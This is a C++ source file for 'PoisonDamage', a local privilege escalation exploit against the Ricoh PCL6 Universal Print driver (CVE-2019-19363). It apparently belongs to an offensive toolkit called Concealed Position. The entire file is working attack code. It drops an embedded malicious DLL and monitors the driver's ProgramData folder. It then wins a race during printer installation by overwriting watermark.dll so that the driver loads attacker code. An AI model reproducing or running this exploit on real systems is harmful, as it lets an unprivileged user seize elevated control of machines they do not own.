#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <filesystem>

#include "poisondamage.hpp"
#include "inject_me.hpp"

/*
 * This code is largely based on the code shared by Pentagrid in their most excellent
 * blog for CVE-2019-19363:
 * 
 * https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/
 * 
 * All credit to them. I have only modified it to be more C++-ey (to me), to operate within the confines of
 * Concealed Position and optimized the exploit... I think :P
*/

namespace
{
    const unsigned int MAX_BUFFER = 4096;
    const DWORD dwNotifyFilter = FILE_NOTIFY_CHANGE_LAST_WRITE | FILE_NOTIFY_CHANGE_SIZE | FILE_NOTIFY_CHANGE_LAST_ACCESS | FILE_NOTIFY_CHANGE_CREATION;

    typedef struct _DIRECTORY_INFO {
        HANDLE      hDir;
        TCHAR       lpszDirName[MAX_PATH];
        CHAR        lpBuffer[MAX_BUFFER];
        DWORD       dwBufLength;
        OVERLAPPED  Overlapped;
    } DIRECTORY_INFO, * PDIRECTORY_INFO, * LPDIRECTORY_INFO;

    void stompOnTarget(const WCHAR* p_target)
    {
        if (HANDLE hFile = CreateFile(p_target, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL))
        {
            std::wcout << "[+] File " << p_target << " has been truncated" << std::endl;
            CloseHandle(hFile);
        }
        else
        {
            // standard behavior on first install though
            std::wcerr << "[!] File " << p_target << " could not be truncated. Likely first install." << std::endl;
        }
    }

    HANDLE configureMonitoring(DIRECTORY_INFO& p_dir_info)
    {
        const WCHAR* const BaseDirName = L"C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\";
        std::wcout << "[+] Configuring monitoring of " << BaseDirName << std::endl;
        lstrcpy(p_dir_info.lpszDirName, BaseDirName);

        // Get a handle to the directory
        p_dir_info.hDir = CreateFile(BaseDirName, FILE_LIST_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
        if (p_dir_info.hDir == INVALID_HANDLE_VALUE)
        {
            std::wcerr << "[-] Unable to open directory " << BaseDirName << " - GLE = " << GetLastError() << std::endl;
        }

        HANDLE hCompPort = CreateIoCompletionPort(p_dir_info.hDir, NULL, (ULONG_PTR)&p_dir_info, 0);
        if (hCompPort == NULL)
        {
            std::cerr << "[-] CreateIoCompletionPort() failed." << std::endl;
            return 0;
        }

        ReadDirectoryChangesW(p_dir_info.hDir, p_dir_info.lpBuffer, MAX_BUFFER, TRUE, dwNotifyFilter, &p_dir_info.dwBufLength, &p_dir_info.Overlapped, NULL);
        return hCompPort;
    }

    void HandleDirectoryChange(HANDLE dwCompletionPort, const WCHAR* p_target)
    {
        int change_counter = 100;
        LPDIRECTORY_INFO di = NULL;

        do
        {
            DWORD numBytes = 0;
            LPOVERLAPPED lpOverlapped = NULL;
            if (!GetQueuedCompletionStatus(dwCompletionPort, &numBytes, (PULONG_PTR)&di, &lpOverlapped, 2000))
            {
                std::cout << "[-] Directory watch timed out." << std::endl;
                return;
            }

            if (di)
            {
                PFILE_NOTIFY_INFORMATION fni = (PFILE_NOTIFY_INFORMATION)di->lpBuffer;

                DWORD cbOffset = 0;
                do
                {
                    cbOffset = fni->NextEntryOffset;
                    if (fni->Action == FILE_ACTION_MODIFIED)
                    {
                        std::wstring filename(fni->FileName, fni->FileNameLength);
                        if (!wcsncmp(filename.c_str(), L"watermark.dll", filename.size()))
                        {
                            change_counter--;
                            if (change_counter > 0)
                            {
                                // just try to copy. don't check error status. it doesn't matter.
                                CopyFile(L"Dll.dll", p_target, FALSE);
                            }
                            else
                            {
                                // welp. I guess it's not gonna happen?
                                return;
                            }
                        }
                    } // eo action mod
                    fni = (PFILE_NOTIFY_INFORMATION)((LPBYTE)fni + cbOffset);
                } while (cbOffset);

                // Reissue the watch command
                ReadDirectoryChangesW(di->hDir, di->lpBuffer, MAX_BUFFER, TRUE, dwNotifyFilter, &di->dwBufLength, &di->Overlapped, NULL);
            }
        } while (di);
    }
}

PoisonDamage::PoisonDamage() :
    Exploit("PCL6 Driver for Universal Print", "PoisonDamage"),
    m_target_directory("C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\"),
    m_target_dll("watermark.dll"),
    m_malicious_dll("Dll.dll")
{
}

PoisonDamage::~PoisonDamage()
{
}

bool PoisonDamage::do_exploit()
{
    if (!drop_dll_to_disk(m_malicious_dll, inject_me_dll, inject_me_dll_len))
    {
        return false;
    }

    if (!initialize_attack_space(m_target_directory))
    {
        return false;
    }

    const WCHAR* target_path = L"C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\watermark.dll";

    bool loop = true;
    while (loop)
    {
        // truncate the target file
        stompOnTarget(target_path);

        // configure monitoring of the target directory
        DIRECTORY_INFO  DirInfo = {};
        HANDLE hCompPort = configureMonitoring(DirInfo);
        if (hCompPort == 0)
        {
            return false;
        }

        // start the watcher thread and trigger installation
        std::thread watch(HandleDirectoryChange, hCompPort, target_path);
        if (!install_printer())
        {
            return false;
        }
        watch.join();

        // monitor cleanup
        PostQueuedCompletionStatus(hCompPort, 0, 0, NULL);
        CloseHandle(DirInfo.hDir);
        CloseHandle(hCompPort);

        // did we succeed?
        if (!std::filesystem::exists("C:\\result.txt"))
        {
            std::cout << "[-] Failed! Try the exploit again!" << std::endl;
            std::cout << "[+] Sleep for 10 seconds" << std::endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(10000));
        }
        else
        {
            std::cout << "[!] Mucho success!" << std::endl;
            loop = false;
        }
    }

    std::cout << "[+] Cleaning up dropped dll" << std::endl;
    _unlink(m_malicious_dll.c_str());
    return true;
}
